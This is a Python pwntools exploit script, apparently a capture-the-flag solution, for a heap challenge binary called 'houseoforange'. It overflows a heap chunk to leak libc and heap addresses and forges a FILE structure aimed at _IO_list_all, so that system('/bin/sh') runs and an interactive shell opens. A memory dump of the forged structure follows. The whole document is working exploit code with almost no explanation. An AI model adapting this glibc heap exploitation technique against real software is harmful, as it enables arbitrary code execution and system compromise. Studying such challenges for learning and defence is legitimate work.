from pwn import *
import sys, time

context.binary = "./houseoforange"
binary = ELF("./houseoforange")

p = process(["./houseoforange"])

def buildf(length, name, price, color):
    p.recvuntil("choice : ")
    p.sendline("1")
    p.recvuntil("name :")
    p.sendline(str(length))
    p.recvuntil("Name :")
    p.sendline(name)
    p.recvuntil("Orange:")
    p.sendline(str(price))
    p.recvuntil("Orange:")
    p.sendline(str(color))

def seef():
    p.recvuntil("choice : ")
    p.sendline("2")

def upgradef(length, name, price, color):
    p.recvuntil("choice : ")
    p.sendline("3")
    p.recvuntil("name :")
    p.sendline(str(length))
    p.recvuntil("Name:")
    p.sendline(name)
    p.recvuntil("Orange: ")
    p.sendline(str(price))
    p.recvuntil("Orange: ")
    p.sendline(str(color))


buildf(0x80, "A" * 0x7f, 100, 1)
upgradef(0x200, "B" * 0x90 + p32(0x64) + p32(0x1f) + p64(0) * 2 + p64(0xf31), 100, 1)           # upgrade 1
buildf(0x1000, "C" * 7, 100, 2)
buildf(0x400, "D" * 7, 100, 3)

# build last 1

seef()
p.recvuntil("D" * 7 + "\n")
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 1640 - 0x3c4b20
main_arena = libc_base + 0x3c4b20
_IO_list_all = libc_base + 0x3c5520
system = libc_base + 0x45390
log.info("libc_base : " + hex(libc_base))
log.info("_IO_list_all : " + hex(_IO_list_all))
log.info("system : " + hex(system))

upgradef(0x500, "E" * 15, 100, 1)       # upgrade 2
seef()

p.recvuntil("E" * 15 + "\n")
heap = u64(p.recv(5).ljust(8, "\x00"))

log.info("heap : " + hex(heap))

# offset 0x410

exp = "a" * 0x410
exp += p32(0x64) + p32(0x1f) + p64(0)

# fake fp

exp += "/bin/sh\x00" + p64(0x61)
exp += p64(0xdeadbeef) + p64(_IO_list_all - 0x10)

# size : 0xb8

exp += p64(0) * 2 * 5
exp += p64(0) + p64(system)
exp += p64(0) * 4
exp += p64(heap + 0x430 + 0x90) + p64(2) + p64(3) + p64(0) + p64(1) + p64(0) * 2
exp += p64(heap + 0x430 + 0x60)

upgradef(0x800, exp, 100, 1)
p.recvuntil("choice : ")
p.sendline("1")

p.interactive()

'''
0x17ec400:	0x0068732f6e69622f	0x0000000000000061
0x17ec410:	0x00007fbe8030cbc8	0x00007fbe8030cbc8
0x17ec420:	0x0000000000000000	0x0000000000000000
0x17ec430:	0x0000000000000000	0x0000000000000000
0x17ec440:	0x0000000000000000	0x0000000000000000
0x17ec450:	0x0000000000000000	0x0000000000000000
0x17ec460:	0x0000000000000000	0x0000000000000000
0x17ec470:	0x0000000000000000	0x00000000004006e5
0x17ec480:	0x0000000000000000	0x0000000000000000
0x17ec490:	0x0000000000000000	0x0000000000000000
0x17ec4a0:	0x00000000017ec490	0x0000000000000002
0x17ec4b0:	0x0000000000000003	0x0000000000000000
0x17ec4c0:	0x0000000000000001	0x0000000000000000
0x17ec4d0:	0x0000000000000000	0x00000000017ec460
0x17ec4e0:	0x0000000000000000	0x0000000000000000
0x17ec4f0:	0x0000000000000000	0x0000000000000000
0x17ec500:	0x0000000000000000	0x0000000000000000
0x17ec510:	0x0000000000000000	0x0000000000000000
0x17ec520:	0x0000000000000000	0x0000000000000000
0x17ec530:	0x0000000000000000	0x0000000000000000
'''
